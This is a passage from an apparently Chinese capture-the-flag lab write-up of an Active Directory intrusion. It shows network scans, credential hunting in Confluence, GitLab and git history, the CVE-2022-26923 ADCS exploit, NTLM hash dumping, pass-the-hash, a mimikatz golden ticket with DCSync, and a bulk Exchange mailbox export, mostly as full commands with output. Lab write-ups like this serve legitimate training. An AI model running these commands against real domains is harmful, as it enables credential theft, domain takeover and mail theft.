class=\"line\">172.24.7.3:88 open</span><br><span class=\"line\">172.24.7.48:445 open</span><br><span class=\"line\">172.24.7.23:8060 open</span><br><span class=\"line\">172.24.7.27:8091 open</span><br><span class=\"line\">172.24.7.27:8090 open</span><br><span class=\"line\">172.24.7.23:9094 open</span><br><span class=\"line\">[*] alive ports len is: 25</span><br><span class=\"line\">start vulscan</span><br><span class=\"line\">[*] NetInfo</span><br><span class=\"line\">[*]172.24.7.16</span><br><span class=\"line\">   [-&gt;]IZMN9U6ZO3VTRNZ</span><br><span class=\"line\">   [-&gt;]172.23.4.12</span><br><span class=\"line\">   [-&gt;]172.24.7.16</span><br><span class=\"line\">[*] NetBios 172.24.7.43     PENTEST\\IZMN9U6ZO3VTRPZ</span><br><span class=\"line\">[*] NetInfo</span><br><span class=\"line\">[*]172.24.7.5</span><br><span class=\"line\">   [-&gt;]DCadmin</span><br><span class=\"line\">   [-&gt;]172.25.12.7</span><br><span class=\"line\">   [-&gt;]172.24.7.5</span><br><span class=\"line\">[*] NetBios 172.24.7.48     PENTEST\\IZAYSXE6VCUHB4Z</span><br><span class=\"line\">[*] NetInfo</span><br><span class=\"line\">[*]172.24.7.43</span><br><span class=\"line\">   [-&gt;]IZMN9U6ZO3VTRPZ</span><br><span class=\"line\">   [-&gt;]172.24.7.43</span><br><span class=\"line\">   [-&gt;]172.26.8.12</span><br><span class=\"line\">[*] NetInfo</span><br><span class=\"line\">[*]172.24.7.48</span><br><span class=\"line\">   [-&gt;]IZAYSXE6VCUHB4Z</span><br><span class=\"line\">   [-&gt;]172.24.7.48</span><br><span class=\"line\">[*] NetBios 172.24.7.5      [+] DC:DCadmin.pen.me                Windows Server 2016 Standard 14393</span><br><span class=\"line\">[*] WebTitle http:&#x2F;&#x2F;172.24.7.23:8060   code:404 len:555    title:404 Not Found</span><br><span class=\"line\">[*] NetBios 172.24.7.3      [+] DC:DC.pentest.me                 Windows Server 2016 Standard 14393</span><br><span class=\"line\">[*] NetInfo</span><br><span class=\"line\">[*]172.24.7.3</span><br><span class=\"line\">   [-&gt;]DC</span><br><span class=\"line\">   [-&gt;]172.25.12.9</span><br><span class=\"line\">   [-&gt;]172.24.7.3</span><br><span class=\"line\">[*] WebTitle http:&#x2F;&#x2F;172.24.7.23        code:502 len:3039   title:GitLab is not responding (502)</span><br><span class=\"line\">[*] OsInfo 172.24.7.3   (Windows Server 2016 Standard 14393)</span><br><span class=\"line\">[*] OsInfo 172.24.7.5   (Windows Server 2016 Standard 14393)</span><br><span class=\"line\">[*] WebTitle http:&#x2F;&#x2F;172.24.7.27:8091   code:204 len:0      title:None</span><br><span class=\"line\">[*] WebTitle http:&#x2F;&#x2F;172.24.7.27:8090   code:302 len:0      title:None 跳转url: http:&#x2F;&#x2F;172.24.7.27:8090&#x2F;login.action?os_destination&#x3D;%2Findex.action&amp;permissionViolation&#x3D;true</span><br><span class=\"line\">[*] WebTitle http:&#x2F;&#x2F;172.24.7.3         code:200 len:703    title:IIS Windows Server</span><br><span class=\"line\">[+] PocScan http:&#x2F;&#x2F;172.24.7.3 poc-yaml-active-directory-certsrv-detect</span><br><span class=\"line\">[+] InfoScan http:&#x2F;&#x2F;172.24.7.27:8090&#x2F;login.action?os_destination&#x3D;%2Findex.action&amp;permissionViolation&#x3D;true [ATLASSIAN-Confluence]</span><br></pre></td></tr></table></figure>\n\n<p>所以目前是四个网段了</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">172.23.4.0&#x2F;24</span><br><span class=\"line\">172.24.7.0&#x2F;24</span><br><span class=\"line\">172.25.12.0&#x2F;24</span><br><span class=\"line\">172.26.8.0&#x2F;24</span><br></pre></td></tr></table></figure>\n\n<p>发现存在ADCS：DC.pentest.me\\pentest-DC-CA <code>PocScan http://172.24.7.3 poc-yaml-active-directory-certsrv-detect</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Users\\usera\\Desktop&gt;certutil</span><br><span class=\"line\">项 0:</span><br><span class=\"line\">  名称:                         &quot;pentest-DC-CA&quot;</span><br><span class=\"line\">  部门:                         &quot;&quot;</span><br><span class=\"line\">  单位:                         &quot;&quot;</span><br><span class=\"line\">  区域:                         &quot;&quot;</span><br><span class=\"line\">  省&#x2F;自治区:                    &quot;&quot;</span><br><span class=\"line\">  国家&#x2F;地区:                    &quot;&quot;</span><br><span class=\"line\">  配置:                         &quot;DC.pentest.me\\pentest-DC-CA&quot;</span><br><span class=\"line\">  Exchange 证书:                &quot;&quot;</span><br><span class=\"line\">  签名证书:                     &quot;&quot;</span><br><span class=\"line\">  描述:                         &quot;&quot;</span><br><span class=\"line\">  服务器:                       &quot;DC.pentest.me&quot;</span><br><span class=\"line\">  颁发机构:                     &quot;pentest-DC-CA&quot;</span><br><span class=\"line\">  净化的名称:                   &quot;pentest-DC-CA&quot;</span><br><span class=\"line\">  短名称:                       &quot;pentest-DC-CA&quot;</span><br><span class=\"line\">  净化的短名称:                 &quot;pentest-DC-CA&quot;</span><br><span class=\"line\">  标记:                         &quot;1&quot;</span><br><span class=\"line\">  Web 注册服务器:               &quot;&quot;</span><br><span class=\"line\">CertUtil: -dump 命令成功完成。</span><br></pre></td></tr></table></figure>\n\n<p>发现存在一个域信任关系：pen.me</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Users\\usera\\Desktop&gt;nltest &#x2F;domain_trusts</span><br><span class=\"line\">域信任的列表:</span><br><span class=\"line\">    0: PEN pen.me (NT 5) (Direct Outbound) (Direct Inbound) ( Attr: foresttrans )</span><br><span class=\"line\">    1: PENTEST pentest.me (NT 5) (Forest Tree Root) (Primary Domain) (Native)</span><br><span class=\"line\">此命令成功完成</span><br></pre></td></tr></table></figure>\n\n<p>edge中发现 172.24.7.27:8090 保存的密码：admin/confluence_ichunqiu_2022</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250531151116233.png\" alt=\"image-20250531151116233\"></p>\n<h2 id=\"ssh私钥-172-23-4-19\"><a href=\"#ssh私钥-172-23-4-19\" class=\"headerlink\" title=\".ssh私钥 172.23.4.19\"></a>.ssh私钥 172.23.4.19</h2><p>翻找文件发现 用户目录 /.ssh/ 存在ssh私钥，看一下hosts文件，发现是最开始的外网linux入口机器，ssh登录 <a href=\"mailto:&#x72;&#x6f;&#x6f;&#116;&#x40;&#49;&#x37;&#x32;&#x2e;&#50;&#x33;&#x2e;&#52;&#46;&#49;&#x39;\">&#x72;&#x6f;&#x6f;&#116;&#x40;&#49;&#x37;&#x32;&#x2e;&#50;&#x33;&#x2e;&#52;&#46;&#49;&#x39;</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">ssh -i id_rsa root@172.23.4.19</span><br><span class=\"line\">root@iZ8vb2zpv31r092kwbov2mZ:~# cat &#x2F;flag</span><br><span class=\"line\">flag&#123;id_rsa_so_useful!&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250531150444038.png\" alt=\"image-20250531150444038\"></p>\n<h1 id=\"vlan2-172-24-7-0-24\"><a href=\"#vlan2-172-24-7-0-24\" class=\"headerlink\" title=\"vlan2 172.24.7.0/24\"></a>vlan2 172.24.7.0/24</h1><h2 id=\"Atlassian-Confluence-172-24-7-27\"><a href=\"#Atlassian-Confluence-172-24-7-27\" class=\"headerlink\" title=\"Atlassian Confluence 172.24.7.27\"></a>Atlassian Confluence 172.24.7.27</h2><p>通过密码进入后台，发现 无间实验室人员名单.xlsx，有一些域用户的预设密码，可以通过ad信息查一下这些高权限用户然后撞密码</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250531151254451.png\" alt=\"image-20250531151254451\"></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250531163559374.png\" alt=\"image-20250531163559374\"></p>\n<h2 id=\"GitLab-172-24-7-23\"><a href=\"#GitLab-172-24-7-23\" class=\"headerlink\" title=\"GitLab 172.24.7.23\"></a>GitLab 172.24.7.23</h2><p>通过预设密码成功登录 luzizhuo，存在一个 private 项目 financial-system-demo</p>\n<p>clone下来</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 -q git clone http:&#x2F;&#x2F;luzizhuo:luzizh_2022%40.Pen@172.24.7.23&#x2F;luzizhuo&#x2F;financial-system-demo.git</span><br></pre></td></tr></table></figure>\n\n<p>翻找文件发现 172.26.8.16:1433 的 MSSQL 数据库凭据</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">sqlservel.driverName&#x3D;com.microsoft.sqlserver.jdbc.SQLServerDriver</span><br><span class=\"line\">sqlservel.dbURL&#x3D;jdbc:sqlserver:&#x2F;&#x2F;172.26.8.16:1433; DatabaseName&#x3D;ykf</span><br><span class=\"line\">sqlservel.userName&#x3D;sa</span><br><span class=\"line\">sqlservel.userPwd&#x3D;sqlserver_2022</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p> 也可以通过 git log 命令来检索 commit 历史内容的方式来查找敏感信息</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"># linux</span><br><span class=\"line\">root@kali-server:~&#x2F;financial-system-demo# git log -p --all | grep -i -E &#39;username|password|passwd|userpwd|jdbc:|secret&#39;</span><br><span class=\"line\">+sqlservel.dbURL&#x3D;jdbc:sqlserver:&#x2F;&#x2F;127.0.0.1:1433; DatabaseName&#x3D;ykf</span><br><span class=\"line\">+sqlservel.userName&#x3D;sa</span><br><span class=\"line\">+sqlservel.userPwd&#x3D;123456</span><br><span class=\"line\">+mysql.dbURL&#x3D;jdbc:mysql:&#x2F;&#x2F;localhost:3306&#x2F;baidu_map?useUnicode&#x3D;true&amp;characterEncoding&#x3D;UTF8&amp;allowMultiQueries&#x3D;true</span><br><span class=\"line\">+mysql.userName&#x3D;root</span><br><span class=\"line\">+mysql.userPwd&#x3D;ykf</span><br><span class=\"line\">+oracle.dbURL&#x3D;jdbc:oracle:thin:@localhost:1521:orcl</span><br><span class=\"line\">+oracle.userName&#x3D;system</span><br><span class=\"line\">+oracle.userPwd&#x3D;ykf</span><br><span class=\"line\">+sqlservel.dbURL&#x3D;jdbc:sqlserver:&#x2F;&#x2F;172.26.8.16:1433; DatabaseName&#x3D;ykf</span><br><span class=\"line\">+sqlservel.userName&#x3D;sa</span><br><span class=\"line\">+sqlservel.userPwd&#x3D;sqlserver_2022</span><br><span class=\"line\">+mysql.dbURL&#x3D;jdbc:mysql:&#x2F;&#x2F;localhost:3306&#x2F;baidu_map?useUnicode&#x3D;true&amp;characterEncoding&#x3D;UTF8&amp;allowMultiQueries&#x3D;true</span><br><span class=\"line\">+mysql.userName&#x3D;root</span><br><span class=\"line\">+mysql.userPwd&#x3D;ykf</span><br><span class=\"line\">+oracle.dbURL&#x3D;jdbc:oracle:thin:@localhost:1521:orcl</span><br><span class=\"line\">+oracle.userName&#x3D;system</span><br><span class=\"line\">+oracle.userPwd&#x3D;ykf</span><br><span class=\"line\">+               String userName &#x3D; rb.getString(&quot;mysql.userName&quot;);</span><br><span class=\"line\">+               String userPwd &#x3D; rb.getString(&quot;mysql.userPwd&quot;);</span><br><span class=\"line\">+                       dbConn &#x3D; DriverManager.getConnection(dbURL, userName, userPwd);</span><br><span class=\"line\">+               String userName &#x3D; rb.getString(&quot;oracle.userName&quot;);</span><br><span class=\"line\">+               String userPwd &#x3D; rb.getString(&quot;oracle.userPwd&quot;);</span><br><span class=\"line\">+                       dbConn &#x3D; DriverManager.getConnection(dbURL, userName, userPwd);</span><br><span class=\"line\">+               String userName &#x3D; rb.getString(&quot;sqlservel.userName&quot;);</span><br><span class=\"line\">+               String userPwd &#x3D; rb.getString(&quot;sqlservel.userPwd&quot;);</span><br><span class=\"line\">+                       dbConn &#x3D; DriverManager.getConnection(dbURL, userName, userPwd);</span><br><span class=\"line\"></span><br><span class=\"line\"># windows</span><br><span class=\"line\">PS C:\\financial-system-demo&gt; git grep -n -i -e &quot;username&quot; -e &quot;userPwd&quot; -e &quot;jdbc:&quot; -e &quot;secret&quot; $(git rev-list --all) -- &#39;:!*.java&#39; &#39;:!*.jsp&#39;</span><br><span class=\"line\">49fe18550af020e791ed83ff8f0f9fcf6d0df447:bin&#x2F;dbconfig.properties:2:sqlservel.dbURL&#x3D;jdbc:sqlserver:&#x2F;&#x2F;127.0.0.1:1433; DatabaseName&#x3D;ykf</span><br><span class=\"line\">49fe18550af020e791ed83ff8f0f9fcf6d0df447:bin&#x2F;dbconfig.properties:3:sqlservel.userName&#x3D;sa</span><br><span class=\"line\">49fe18550af020e791ed83ff8f0f9fcf6d0df447:bin&#x2F;dbconfig.properties:4:sqlservel.userPwd&#x3D;123456</span><br><span class=\"line\">49fe18550af020e791ed83ff8f0f9fcf6d0df447:bin&#x2F;dbconfig.properties:7:mysql.dbURL&#x3D;jdbc:mysql:&#x2F;&#x2F;localhost:3306&#x2F;baidu_map?useUnicode&#x3D;true&amp;characterEncoding&#x3D;UTF8&amp;allowMultiQueries&#x3D;true</span><br><span class=\"line\">49fe18550af020e791ed83ff8f0f9fcf6d0df447:bin&#x2F;dbconfig.properties:8:mysql.userName&#x3D;root</span><br><span class=\"line\">49fe18550af020e791ed83ff8f0f9fcf6d0df447:bin&#x2F;dbconfig.properties:9:mysql.userPwd&#x3D;ykf</span><br><span class=\"line\">49fe18550af020e791ed83ff8f0f9fcf6d0df447:bin&#x2F;dbconfig.properties:12:oracle.dbURL&#x3D;jdbc:oracle:thin:@localhost:1521:orcl</span><br><span class=\"line\">49fe18550af020e791ed83ff8f0f9fcf6d0df447:bin&#x2F;dbconfig.properties:13:oracle.userName&#x3D;system</span><br><span class=\"line\">49fe18550af020e791ed83ff8f0f9fcf6d0df447:bin&#x2F;dbconfig.properties:14:oracle.userPwd&#x3D;ykf</span><br><span class=\"line\">49fe18550af020e791ed83ff8f0f9fcf6d0df447:src&#x2F;dbconfig.properties:2:sqlservel.dbURL&#x3D;jdbc:sqlserver:&#x2F;&#x2F;172.26.8.16:1433; DatabaseName&#x3D;ykf</span><br><span class=\"line\">49fe18550af020e791ed83ff8f0f9fcf6d0df447:src&#x2F;dbconfig.properties:3:sqlservel.userName&#x3D;sa</span><br><span class=\"line\">49fe18550af020e791ed83ff8f0f9fcf6d0df447:src&#x2F;dbconfig.properties:4:sqlservel.userPwd&#x3D;sqlserver_2022</span><br><span class=\"line\">49fe18550af020e791ed83ff8f0f9fcf6d0df447:src&#x2F;dbconfig.properties:7:mysql.dbURL&#x3D;jdbc:mysql:&#x2F;&#x2F;localhost:3306&#x2F;baidu_map?useUnicode&#x3D;true&amp;characterEncoding&#x3D;UTF8&amp;allowMultiQueries&#x3D;true</span><br><span class=\"line\">49fe18550af020e791ed83ff8f0f9fcf6d0df447:src&#x2F;dbconfig.properties:8:mysql.userName&#x3D;root</span><br><span class=\"line\">49fe18550af020e791ed83ff8f0f9fcf6d0df447:src&#x2F;dbconfig.properties:9:mysql.userPwd&#x3D;ykf</span><br><span class=\"line\">49fe18550af020e791ed83ff8f0f9fcf6d0df447:src&#x2F;dbconfig.properties:12:oracle.dbURL&#x3D;jdbc:oracle:thin:@localhost:1521:orcl</span><br><span class=\"line\">49fe18550af020e791ed83ff8f0f9fcf6d0df447:src&#x2F;dbconfig.properties:13:oracle.userName&#x3D;system</span><br><span class=\"line\">49fe18550af020e791ed83ff8f0f9fcf6d0df447:src&#x2F;dbconfig.properties:14:oracle.userPwd&#x3D;ykf</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ADCS-172-24-7-3-172-25-12-9\"><a href=\"#ADCS-172-24-7-3-172-25-12-9\" class=\"headerlink\" title=\"ADCS 172.24.7.3 - 172.25.12.9\"></a>ADCS 172.24.7.3 - 172.25.12.9</h2><p>ad看了MAQ=10，打CVE-2022-26923</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">certipy-ad account create -u usera -p Admin3gv83 -dc-ip 172.24.7.3 -user evil -pass Qwer1234 -dns DC.pentest.me -debug</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250531153546583.png\" alt=\"image-20250531153546583\"></p>\n<p>配置hosts，请求证书</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">certipy-ad req -u &#39;evil$@pentest.me&#39; -p Qwer1234 -ca &#39;pentest-DC-CA&#39; -dc-ip 172.24.7.3  -template Machine -debug</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250531153522583.png\" alt=\"image-20250531153522583\"></p>\n<p>认证证书</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 -q certipy-ad auth -pfx dc.pfx -dc-ip 172.24.7.3 -debug</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250531153510024.png\" alt=\"image-20250531153510024\"></p>\n<p>远程导hash</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 -q impacket-secretsdump pentest.me&#x2F;&#39;dc$&#39;@DC.pentest.me -hashes :c974c06ae166986142442841151b590f -dc-ip 172.24.7.3 -just-dc-ntlm -user-status</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250531153637609.png\" alt=\"image-20250531153637609\"></p>\n<p>PTH DC</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 -q nxc smb 172.24.7.3 -u Administrator -H 5d0f79eaf7a6c0ad70bcfce6522d2da1 -x &#39;type  C:\\Users\\Administrator\\Desktop\\flag.txt&#39;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"PTH-172-24-7-48\"><a href=\"#PTH-172-24-7-48\" class=\"headerlink\" title=\"PTH 172.24.7.48\"></a>PTH 172.24.7.48</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 -q nxc smb 172.24.7.48 -u Administrator -H 5d0f79eaf7a6c0ad70bcfce6522d2da1 -x &#39;type C:\\Users\\userc\\Desktop\\flag.txt&#39;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"PTH-172-24-7-43-172-26-8-12\"><a href=\"#PTH-172-24-7-43-172-26-8-12\" class=\"headerlink\" title=\"PTH 172.24.7.43 - 172.26.8.12\"></a>PTH 172.24.7.43 - 172.26.8.12</h2><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 -q nxc smb 172.24.7.43  -u Administrator -H 5d0f79eaf7a6c0ad70bcfce6522d2da1 -x &#39;type C:\\Users\\userb\\Desktop\\flag.txt&#39;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"VLAN-3-172-25-12-0-24\"><a href=\"#VLAN-3-172-25-12-0-24\" class=\"headerlink\" title=\"VLAN 3 - 172.25.12.0/24\"></a>VLAN 3 - 172.25.12.0/24</h1><h2 id=\"SID-History-172-25-12-7\"><a href=\"#SID-History-172-25-12-7\" class=\"headerlink\" title=\"SID History 172.25.12.7\"></a>SID History 172.25.12.7</h2><p>SID History 横向到 DCadmin.PEN.ME</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">mimikatz # kerberos::golden &#x2F;user:administrator &#x2F;domain:PENTEST.ME &#x2F;sid:S-1-5-21-3745972894-1678056601-2622918667 &#x2F;krbtgt:08b1732d06c09e84119486cbb94a5569 &#x2F;sids:S-1-5-21-708081054-195637743-2881014444-519 &#x2F;ptt</span><br><span class=\"line\">User      : administrator</span><br><span class=\"line\">Domain    : PENTEST.ME (PENTEST)</span><br><span class=\"line\">SID       : S-1-5-21-3745972894-1678056601-2622918667</span><br><span class=\"line\">User Id   : 500</span><br><span class=\"line\">Groups Id : *513 512 520 518 519</span><br><span class=\"line\">Extra SIDs: S-1-5-21-708081054-195637743-2881014444-519 ;</span><br><span class=\"line\">ServiceKey: 08b1732d06c09e84119486cbb94a5569 - rc4_hmac_nt</span><br><span class=\"line\">Lifetime  : 2025&#x2F;5&#x2F;31 16:04:02 ; 2035&#x2F;5&#x2F;29 16:04:02 ; 2035&#x2F;5&#x2F;29 16:04:02</span><br><span class=\"line\">-&gt; Ticket : ** Pass The Ticket **</span><br><span class=\"line\"></span><br><span class=\"line\"> * PAC generated</span><br><span class=\"line\"> * PAC signed</span><br><span class=\"line\"> * EncTicketPart generated</span><br><span class=\"line\"> * EncTicketPart encrypted</span><br><span class=\"line\"> * KrbCred generated</span><br><span class=\"line\"></span><br><span class=\"line\">Golden ticket for &#39;administrator @ PENTEST.ME&#39; successfully submitted for current session</span><br><span class=\"line\"></span><br><span class=\"line\">mimikatz # log</span><br><span class=\"line\">Using &#39;mimikatz.log&#39; for logfile : OK</span><br><span class=\"line\"></span><br><span class=\"line\">mimikatz # lsadump::dcsync &#x2F;domain:PEN.ME &#x2F;all &#x2F;csv</span><br><span class=\"line\">[DC] &#39;PEN.ME&#39; will be the domain</span><br><span class=\"line\">[DC] &#39;DCadmin.pen.me&#39; will be the DC server</span><br><span class=\"line\">[DC] Exporting domain &#39;PEN.ME&#39;</span><br><span class=\"line\">502     krbtgt  6d72190307a2b763c222714e0eebc339        514</span><br><span class=\"line\">1137    HealthMailbox285895e    511c807cd8e59b000bc312255543e5fd        66048</span><br><span class=\"line\">1138    HealthMailbox51cfeb1    f305168ff895e29d3745888c6a793002        66048</span><br><span class=\"line\">1139    HealthMailboxc4b8425    18e23133d26cdb9739e242d8bbc34809        66048</span><br><span class=\"line\">1140    HealthMailbox528d2e1    e4a755e4a52824dff8fbc0bdc407f72b        66048</span><br><span class=\"line\">1141    HealthMailboxc5e00fd    08333ec70b3f1f6a0d1d72d96e3d04b6        66048</span><br><span class=\"line\">1142    HealthMailboxee2d866    ef20a63fe85c29209f1e248370968513        66048</span><br><span class=\"line\">1143    HealthMailbox190d1f5    bbac9374b2dda3615fbfc262489839ab        66048</span><br><span class=\"line\">1144    HealthMailbox45dde9b    dcb96076b068d0a73b2e1adbd23a1bd2        66048</span><br><span class=\"line\">1145    HealthMailboxbb65e08    f3839bb82cf1c86713244f7e72623607        66048</span><br><span class=\"line\">1146    userd   b8e52066381b9c3d08d8661a0c0d5a72        66048</span><br><span class=\"line\">1148    exchange        21a43bd74a20a330ef77a4e7bd179d8c        66048</span><br><span class=\"line\">500     Administrator   0f91138ef5392b87416ed41cb6e810b7        512</span><br><span class=\"line\">1000    DCADMIN$        29f581603b74c08957720d3f9065ffc9        532480</span><br><span class=\"line\">1147    IZ88QYK8Y8Y3VXZ$        fae1af6cad7ca176d9ed0f21221eadea        4096</span><br><span class=\"line\">1104    IZ1TUCEKFDPCEMZ$        ffba9d6c141acde65095ad25b806d499        4096</span><br><span class=\"line\">1149    PENTEST$        52c2ec82dedb65d67df048e03c00ca77        2080</span><br><span class=\"line\">1135    HealthMailbox7e80c8e    7eac6a81608d27ed86ea60c76fae5c09        66048</span><br><span class=\"line\">1136    HealthMailboxeda7e80    7c9ec358a9fc91336cb7cba31b91b7aa        66048</span><br></pre></td></tr></table></figure>\n\n<p>PTH DCadmin.pen.me</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 -q impacket-wmiexec -hashes :0f91138ef5392b87416ed41cb6e810b7 -codec GBK pen.me&#x2F;Administrator@172.25.12.7 &#39;type C:\\Users\\Administrator\\Desktop\\flag.txt&#39;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"PTH-172-25-12-29\"><a href=\"#PTH-172-25-12-29\" class=\"headerlink\" title=\"PTH 172.25.12.29\"></a>PTH 172.25.12.29</h2><p>PTH pen.me的DC</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 -q impacket-wmiexec pen.me&#x2F;Administrator@172.25.12.29 -hashes :0f91138ef5392b87416ed41cb6e810b7 -code GBK</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Exchange-取邮件-172-25-12-19\"><a href=\"#Exchange-取邮件-172-25-12-19\" class=\"headerlink\" title=\"Exchange 取邮件 172.25.12.19\"></a>Exchange 取邮件 172.25.12.19</h2><p>PTH 邮服</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 -q impacket-wmiexec -hashes :0f91138ef5392b87416ed41cb6e810b7 -codec GBK pen.me&#x2F;Administrator@172.25.12.19 &#39;type C:\\Users\\Administrator.PEN\\Desktop\\flag.txt&#39;</span><br></pre></td></tr></table></figure>\n\n<p>脚本导邮件：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">proxychains4 python3 pthexchange.py --target https:&#x2F;&#x2F;172.25.12.19&#x2F; --username exchange --password &#39;00000000000000000000000000000000:21a43bd74a20a330ef77a4e7bd179d8c&#39; --action Download</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/%E6%98%A5%E7%A7%8B%E4%BA%91%E5%A2%83/image-20250531162145865.png\" alt=\"image-20250531162145865\"></p>\n<blockquote>\n<p>手动导邮件</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\Administrator.PEN\\Desktop&gt; cmd &#x2F;c &quot;echo %ExchangeInstallPath%&quot;</span><br><span class=\"line\">C:\\Program Files\\Microsoft\\Exchange Server\\V15\\</span><br><span class=\"line\"></span><br><span class=\"line\">PS C:\\Users\\Administrator.PEN\\Desktop&gt; PowerShell.exe -PSConsoleFile &quot;C:\\Program Files\\Microsoft\\Exchange Server\\V15\\Bin\\exshell.psc1&quot; -Command &quot;Get-Mailbox | Get-MailboxStatistics&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">DisplayName               ItemCount    StorageLimitStatus                                                 LastLogonTime</span><br><span class=\"line\">-----------               ---------    ------------------                                                 -------------</span><br><span class=\"line\">Administrator             148                                                                         2022&#x2F;8&#x2F;3 11:01:01</span><br><span class=\"line\">发现搜索邮箱              28</span><br><span class=\"line\">userd                     21</span><br><span class=\"line\">exchange                  310                                                                         2022&#x2F;8&#x2F;3 11:09:36</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">PS C:\\Users\\Administrator.PEN\\Desktop&gt; PowerShell.exe -PSConsoleFile &quot;$&#123;Env:ExchangeInstallPath&#125;Bin\\exshell.psc1&quot; -Command &#123;Get-Mailbox -OrganizationalUnit Users -Resultsize unlimited |%&#123;New-MailboxexportRequest -mailbox $_.name -FilePath (&quot;\\\\localhost\\c$\\users\\public\\&quot;+($_.name)+&quot;.pst&quot;) -BadItemLimit unlimited -AcceptLargeDataLoss -CompletedRequestAgeLimit0&#125;&#125;</span><br><span class=\"line\">警告: 当无法从源数据库读取某个邮件或无法将该邮件写入目标数据库时，会将该邮件视为已损坏。通过指定非零</span><br><span class=\"line\">BadItemLimit，您会请求 Exchange 不将这类邮件复制到目标邮箱。移动完成时，这些损坏的邮件将在目标邮箱上不可用。</span><br><span class=\"line\"></span><br><span class=\"line\">警告: 当无法从源数据库读取某个邮件或无法将该邮件写入目标数据库时，会将该邮件视为已损坏。通过指定非零</span><br><span class=\"line\">BadItemLimit，您会请求 Exchange 不将这类邮件复制到目标邮箱。移动完成时，这些损坏的邮件将在目标邮箱上不可用。</span><br><span class=\"line\">Name          Mailbox                                                                    Status</span><br><span class=\"line\">----          -------                                                                    ------</span><br><span class=\"line\">MailboxExport pen.me&#x2F;Users&#x2F;Administrator                                                 Queued</span><br><span class=\"line\">MailboxExport pen.me&#x2F;Users&#x2F;DiscoverySearchMailbox &#123;D919BA05-46A6-415f-80AD-7E09334BB852&#125; Queued</span><br><span class=\"line\">警告: 当无法从源数据库读取某个邮件或无法将该邮件写入目标数据库时，会将该邮件视为已损坏。通过指定非零</span><br><span class=\"line\">BadItemLimit，您会请求 Exchange 不将这类邮件复制到目标邮箱。移动完成时，这些损坏的邮件将在目标邮箱上不可用。</span><br><span class=\"line\">MailboxExport pen.me&#x2F;Users&#x2F;userd                                                         Queued</span><br><span class=\"line\">警告: 当无法从源数据库读取某个邮件或无法将该邮件写入目标数据库时，会将该邮件视为已损坏。通过指定非零</span><br><span class=\"line\">BadItemLimit，您会请求 Exchange 不将这类邮件复制到目标邮箱。移动完成时，这些损坏的邮件将在目标邮箱上不可用。</span><br><span class=\"line\">MailboxExport pen.me&#x2F;Users&#x2F;exchange                                                      Queued</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">PS C:\\Users\\Administrator.PEN\\Desktop&gt; ls C:\\Users\\Public\\*.pst</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    目录: C:\\Users\\Public</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span 